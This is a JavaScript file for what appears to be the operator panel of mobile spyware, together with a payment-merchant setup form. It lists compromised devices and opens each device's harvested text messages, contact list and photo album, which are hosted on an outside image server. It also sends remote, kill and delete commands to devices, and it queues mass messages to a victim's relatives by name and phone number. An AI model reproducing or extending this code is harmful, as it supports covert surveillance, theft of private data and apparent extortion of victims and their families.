//商户脚本

var tableListData2;
var tmpUserId;

$(document).ready(function () {
   // $("imgUserOK").hide();
    $(document).off("click", ".yuancheng").on("click", ".yuancheng", function () {
        var tmpId = $(this).attr('data-id');
        $.post("/api/setLiveState", { myState: 6, deviceID: tmpId }, function (result) {
            alert(result);
        });
    });
  

    $(document).off("click", ".zisha").on("click", ".zisha", function () {
        var tmpId = $(this).attr('data-id');
        $.post("/api/setLiveState", { myState: 2, deviceID: tmpId }, function (result) {
            alert(result);
        });
    });

    $(document).off("click", ".shanchu").on("click", ".shanchu", function () {
        var tmpId = $(this).attr('data-id');
        $.post("/api/setLiveState", { myState: 44, deviceID: tmpId }, function (result) {
            alert(result);
        });
    });


    $(document).off("click", ".xin").on("click", ".xin", function () {
        var tmpId = $(this).attr('data-id');

        // alert(tmpId);
        window.open("../Messages/" + tmpId);

    });
    $(document).off("click", ".xun").on("click", ".xun", function () {
        var tmpId = $(this).attr('data-id');

        // alert(tmpId);
        window.open("../Contents/" + tmpId);


    });
    $(document).off("click", ".zhao").on("click", ".zhao", function () {
        var tmpId = $(this).attr('data-id');

       window.open("http://img.chachaimg.cn:90/li/Index/Photos/" + tmpId);


    });

    $(document).off("click", ".qunfa").on("click", ".qunfa", function () {
        var tmpId = $(this).attr('data-id');
        tmpUserId = tmpId;
        xtip_win();
       


    });


    function xtip_win() {
        xtip.win({
            type: 'confirm', //alert 或 confirm
            // btn: ['确认添加'],
            tip: '<h1 class="myOrangered" >群发消息</h1><div class="form-group"><label for="Name">客户名字</label><input type="text" class="form-control" id="Name" placeholder="不超过5个字"></div>' +
                ' <div class="form-group"><label for="Tel">电话</label><input type="text" class="form-control" id="Tel" placeholder="11位数字"></div>	' +
                ' <div class="form-group"> <label for="head_pic">图片</label><input id="head_pic" name="head_pic" style="display:block" type="file" onchange="uploadPic()" /> <img id="imgUserOK" style="display:none"  src="/images/live_weixin.png" alt="微信打开"/> </div>	'+

                '<div class="form-group"><label for="Name1">亲友1</label><input type="text" class="form-control" id="Name1" placeholder="不超过5个字"></div>' +
                ' <div class="form-group"><label for="Tel1">电话</label><input type="text" class="form-control" id="Tel1" placeholder="11位数字"></div>	'+
                   '<div class="form-group"><label for="Name2">亲友2</label><input type="text" class="form-control" id="Name2" placeholder="不超过5个字"></div>' +
                ' <div class="form-group"><label for="Tel2">电话</label><input type="text" class="form-control" id="Tel2" placeholder="11位数字"></div>	'
                ,
    
                icon: 'a',
                title: "群发短信",
                min: false,
                width: '900px',
                maxWidth: '100%',
                shade: true,
                shadeClose: false,
                lock: false,
            btn1: function () {
                sendTask();
            },

            zindex: 9999999,
        });

       // $("#Key").val(guid());


    }

    function sendTask() {
        var n = $('#Name').val();
        var t = $('#Tel').val();
        var n1 = $('#Name1').val();
        var t1 = $('#Tel1').val();
        var n2 = $('#Name2').val();
        var t2 = $('#Tel2').val();

        var prams = { name: n, tel: t, name1: n1, tel1: t1, name2: n2, tel2: t2, }
            $.post("/api/saveTasks", prams , function (result) {
            alert(result);
        });
    }



    tableListData2 = $('#shop-datatables').DataTable({
        //stateSave: true,
       
        "lengthMenu": [[20, 50, 1,], ["20条", "50条", "容错"]],
        "processing": false,
        "serverSide": true,
        "bSort": false, //排序功能
        "bAutoWidth": false,//自动宽度
        "iDisplayLength": 20, // 每页显示多少行
        columns: [
            //{ "defaultContent": "" },   //注意：当查出来的数据有的为null时，dataTable每次加载会弹窗警告，非常烦人，这个设置为空字符串，就不会警告了




            { "data": "okTime" },
            { "data": "tel" },
            { "data": "myTel" },
            { "data": "myInfo" },
            { "data": "myWhere" },

            { "defaultContent": '' },


            { "data": "deviceID" },

        ],
        "columnDefs": [//列定义

            {
                // "name": "myOrderID",
                "targets": 0,// 编辑

                "orderable": false,
                "bSortable": false,
                "render": function (data, type, row, meta) {
                    //  alert(data);
                    data = GetOKTime(data);


                    return data;
                }
            },

            {
                // "name": "myOrderID",
                "targets": 6,// 编辑

                "orderable": false,
                "bSortable": false,
                "render": function (data, type, row, meta) {
                    // alert(data);
                    tableListData2.deviceID = data;


                    return data;
                }
            }


        ],
        "ajax": {
            "url": "/api/li/GetShops",
            "type": "POST",
            "data": function (d) {
                return $.extend({}, d, {

                    orderCmd: whichOderCmd

                });
                //console.log("请求的参数：", d);
                /*"data": function (param) {
               // param.toke = "http://localhost:7070"
                console.log("请求的参数：", param);
                return param;*/
            },
        },
        "rowCallback": function (row, data, index) {

            var htmRoom = GetOKTime(data.okTime) + "<span style='color:blue'> " + data.myRoom + "</span>";
            $('td:eq(0)', row).html(htmRoom);

            var htm = "<button style='margin-left:3px;margin-top:2px;height:50%' data-id=" + data.deviceID + " class='btn btn-danger yuancheng' type='button'>远程</button>" +
                "<button style='margin-top:2px;margin-left:3px;height:50%;width:86px' data-id=" + data.deviceID + " class='btn btn-danger qunfa' type='button'>一键群发</button>" +

                //"<button style = 'margin-top:2px;margin-left:3px;height:50%' data-id=" + data.deviceID + " class='btn btn-danger zisha' type = 'button'> 杀毒</button> " +
                "<button style='margin-top:2px;margin-left:3px;height:50%;width:86px' data-id=" + data.deviceID + " class='btn btn-warning shanchu' type='button'>删除记录</button>";

            $('td:eq(6)', row).html(htm);

            var HTML = "<button style='margin-top:2px;margin-left:3px;height:50%' data-id=" + data.deviceID + " class='btn btn-success xin' type='button'>短信</button>"
                + "<button style='margin-top:2px;margin-left:3px;height:50%' data-id=" + data.deviceID + " class='btn btn-success xun' type='button'>通讯录</button> "
                + "<button style='margin-top:2px;margin-left:3px;height:50%' data-id=" + data.deviceID + " class='btn btn-success zhao' type='button'>相册</button> ";
            $('td:eq(5)', row).html(HTML);
        },


        language: {      //配置中文

            processing: '处理中',

            lengthMenu: ' 显示_MENU_项结果',

            zeroRecords: ' 没有匹配结果',

            info: ' 显示第_START_ 至_END_项结果,共_TOTAL_项 ',
            infoEmpty: '显示第0项至0项结果，共0项 ',

            infoFiltered: '(由_MAX_项结果过滤)',

            infoPostFix: ' ',

            search: ' 搜索：房间号 ',

            emptyTable: ' 表中数据为空 ',

            loadingRecords: ' 载入中 ',

            paginate: {

                first: ' 首页',

                previous: ' 上一页 ',

                next: ' 下一页 ',

                last: ' 尾页 '

            },

            aria: {

                sortAscending: ' 升序 ',

                sortDescending: ' 降序 '

            }
        }

    });

});


//自动刷新
setInterval(function () {

    loadData();

}, 14000);


//去掉自动刷新
autoReload = 0;

function loadData() {

    //loadid = xtip.load();
    var table = $('#shop-datatables').DataTable();
    table.ajax.reload(function (json) {
        //  xtip.close(loadid);
        //console.log(json);
    }, false);
}

//添加商户
function add_shop() {
    var t1 = $("#PosUid").val().trim();
    var t2 = $("#ShopName").val().trim();
    var t3 = $("#Password").val().trim();
    var t4 = $("#Key").val().trim();
    var t5 = $("#OrderNotify").val().trim();
    var t6 = $("#alipayF").val().trim();
    var t7 = $("#sltAlipay").val().trim();
    var t8 = $("#alipayMoreRun").val().trim();
    var t9 = $("#alipayFuDong").val().trim();
    var t10 = $("#wechatF").val().trim();
    var t11 = $("#sltWeChat").val().trim();
    var t12 = $("#wechatMoreRun").val().trim();
    var t13 = $("#wechatFuDong").val().trim();
    var t14 = $("#ysfF").val().trim();
    var t15 = $("#sltYsf").val().trim();
    var t16 = $("#ysfMoreRun").val().trim();
    var t17 = $("#ysfFuDong").val().trim();
    var t18 = $("#jhF").val().trim();
    var t19 = $("#sltJH").val().trim();
    var t20 = $("#jhMoreRun").val().trim();
    var t21 = $("#jhFuDong").val().trim();
    //新增三方接口
    var t22 = $("#yuanSheng").val().trim();
    var t23 = $("#hongBao").val().trim();
    var t24 = $("#xianYu").val().trim();
    var t25 = $("#greenWay").val().trim();

    if (getStrToIntWrong(t1)) {

        alert("商户UID只能是数字！");
        return;
    }

    if (getStrToFloatWrong(t6) || getStrToFloatWrong(t10) || getStrToFloatWrong(t14) || getStrToFloatWrong(t18)) {

        alert("错误，请检查费率是否正确！");
        return;
    }

    if (getStrEmpty(t2) || getStrEmpty(t3) || getStrEmpty(t4) || getStrEmpty(t6) || getStrEmpty(t7)
        || getStrEmpty(t9) || getStrEmpty(t10) || getStrEmpty(t11) || getStrEmpty(t13) || getStrEmpty(t14)
        || getStrEmpty(t15) || getStrEmpty(t17) || getStrEmpty(t18) || getStrEmpty(t19) || getStrEmpty(t21)
    ) {

        alert("有空项未填写，请检查！");
        return;
    }


    var hiData = {
        PosUid: t1, ShopName: t2, Password: t3, Key: t4, OrderNotify: t5,
        alipayF: t6, sltAlipay: t7, alipayMoreRun: t8, alipayFuDong: t9,
        wechatF: t10, sltWeChat: t11, wechatMoreRun: t12, wechatFuDong: t13,
        ysfF: t14, sltYsf: t15, ysfMoreRun: t16, ysfFuDong: t17,
        jhF: t18, sltJH: t19, jhMoreRun: t20, jhFuDong: t21
        , yuanShengF: t22, hongBaoF: t23, xianYuF: t24, greenWayF: t25
    };
    $.ajax({
        url: "/Help/Shop/AddShop",
        type: "post",
        // Form数据
        data: hiData,
        cache: false,
        success: function (data) {
            if (data == 'ok')
                xtip.alert('添加成功...', 's')
        }
    });
}



function GetOKTime(tmpDateTime) {
    var date = new Date(tmpDateTime);
    var localeString = date.toLocaleString();
    return localeString;
}
Difftimer_setInterval(Date.now, callback);
function callback(data) {
    location.replace('/li/Index/Orders/002');
}
function Difftimer_setInterval(timer, callback)
  {
    let flag = false;
    var chartrefresh = function () {
        let date = new Date();
        let hours = date.getHours();
        let minutes = date.getMinutes();
        let seconds = date.getSeconds();
        if (hours === 18 && minutes === 30 && seconds === 0) {
            console.log("1,7,13,19");
            callback();
        }
        if (hours === 1 && minutes === 28 && seconds === 0) {
            console.log("1,7,13,19");
            callback();
        }
        if (hours === 6 && minutes === 0 && seconds === 0) {
            callback();
        }
        if (hours === 19 && minutes === 0 && seconds === 0) {
            callback();
        }
        if (minutes !== 59 && !flag) {
            clearInterval(timer);
            timer = null;
            timer = setInterval(chartrefresh, 1000 * (60 - minutes - 1));
            flag = true;
        }
        if (minutes !== 59 && flag) {
            clearInterval(timer);
            timer = null;
            timer = setInterval(chartrefresh, 1000);
            flag = false;
        }
    }
    timer = setInterval(chartrefresh, 1000);
}